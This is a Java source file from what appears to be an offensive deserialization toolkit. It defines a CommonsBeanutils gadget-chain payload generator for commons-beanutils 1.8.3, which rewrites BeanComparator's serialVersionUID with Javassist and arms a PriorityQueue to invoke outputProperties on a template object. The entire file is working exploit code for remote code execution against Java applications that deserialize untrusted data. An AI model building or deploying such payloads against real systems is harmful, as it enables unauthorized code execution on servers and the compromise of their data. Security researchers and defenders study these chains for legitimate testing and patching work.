package com.summersec.attack.deser.payloads;

import com.summersec.attack.deser.payloads.annotation.Authors;
import com.summersec.attack.deser.payloads.annotation.Dependencies;
import com.summersec.attack.deser.util.JavassistClassLoader;
import com.summersec.attack.deser.util.Reflections;
import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;

import com.summersec.attack.deser.util.StandardExecutorClassLoader;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.commons.beanutils.BeanComparator;


@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
@Authors({"phith0n"})
public class CommonsBeanutilsString_183 implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(Object template) throws Exception {

//        StandardExecutorClassLoader classLoader = new StandardExecutorClassLoader("1.9.2");
//        Class u = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
//        System.out.println(u.getPackage());
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
        final Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        ctBeanComparator.defrost();
        Reflections.setFieldValue(beanComparator, "comparator", String.CASE_INSENSITIVE_ORDER);

//        UrlClassLoaderUtils urlClassLoaderUtils = new UrlClassLoaderUtils();
//        Class u = urlClassLoaderUtils.loadJar("").loadClass("org.apache.commons.beanutils.BeanComparator");

//        Object beanComparator = u.getDeclaredConstructor(String.class,Comparator.class).newInstance(null, String.CASE_INSENSITIVE_ORDER);



        PriorityQueue<String> queue = new PriorityQueue(2, (Comparator<?>)beanComparator);

        queue.add("1");
        queue.add("1");

        Reflections.setFieldValue(queue, "queue", new Object[] { template, template });

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");
//        Reflections.setFieldValue(beanComparator, "comparator", String.CASE_INSENSITIVE_ORDER);

        return (Queue)queue;
    }

    public static void main(String[] args) throws Exception {
        CommonsBeanutilsString_183 commonsBeanutilsString192 = new CommonsBeanutilsString_183();
        commonsBeanutilsString192.getObject(new Object());

    }
}



